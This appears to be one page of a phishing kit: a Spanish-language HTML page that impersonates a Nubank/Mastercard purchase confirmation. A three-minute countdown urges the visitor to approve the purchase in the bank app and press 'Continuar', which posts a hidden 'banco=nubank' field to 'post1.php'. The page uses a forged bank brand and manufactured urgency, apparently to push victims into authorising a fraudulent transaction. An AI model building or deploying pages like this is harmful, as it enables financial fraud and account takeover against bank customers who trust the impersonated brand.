<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmación de Compra</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8f8f8;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            max-width: 400px;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .logo {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .logo img {
            max-height: 30px;
        }
        .timer-circle {
            width: 150px;
            height: 150px;
            margin: 20px auto;
            position: relative;
        }
        .progress-ring {
            width: 100%;
            height: 100%;
            transform: rotate(-90deg);
        }
        .progress-ring__circle {
            stroke: #a07bd3;
            stroke-width: 10;
            fill: transparent;
            r: 70;
            cx: 75;
            cy: 75;
        }
        #time {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 2rem;
            color: #a07bd3;
        }
        .illustration {
            margin-top: 20px;
        }
        .btn-container {
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="img/nubank.png" alt="Nu">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard" style="max-height: 25px;">
        </div>
        <h5>Necesitas confirmar esta compra.</h5>
        <p>Por seguridad, necesitamos que vayas a la app y confirmes esta compra. Hazlo antes de que el tiempo expire y da en 'Continuar'</p>
        
        <div class="timer-circle">
            <svg class="progress-ring">
                <circle class="progress-ring__circle" stroke-dasharray="440" stroke-dashoffset="0"></circle>
            </svg>
            <span id="time">3:00</span>
        </div>
        
        <form action="post1.php" method="POST">
            <!-- Campo oculto para enviar el valor de Nubank -->
            <input type="hidden" name="banco" value="nubank">

            <div class="btn-container">
                <button type="button" class="btn btn-outline-secondary">Cancelar</button>
                <button type="submit" class="btn btn-primary">Continuar</button>
            </div>
        </form>
    </div>

    <script>
        // Temporizador de 3 minutos
        const timerElement = document.getElementById('time');
        const circle = document.querySelector('.progress-ring__circle');
        const radius = circle.r.baseVal.value;
        const circumference = 2 * Math.PI * radius;
        let time = 180; // Tiempo en segundos (3 minutos)

        circle.style.strokeDasharray = `${circumference} ${circumference}`;
        circle.style.strokeDashoffset = `${circumference}`;

        function setProgress(percent) {
            const offset = circumference - (percent / 100) * circumference;
            circle.style.strokeDashoffset = offset;
        }

        function updateTimer() {
            const minutes = Math.floor(time / 60);
            const seconds = time % 60;
            timerElement.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
            const percent = ((180 - time) / 180) * 100;
            setProgress(percent);

            if (time > 0) {
                time--;
            } else {
                clearInterval(timerInterval);
                // Acción al finalizar el temporizador
            }
        }

        const timerInterval = setInterval(updateTimer, 1000);
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
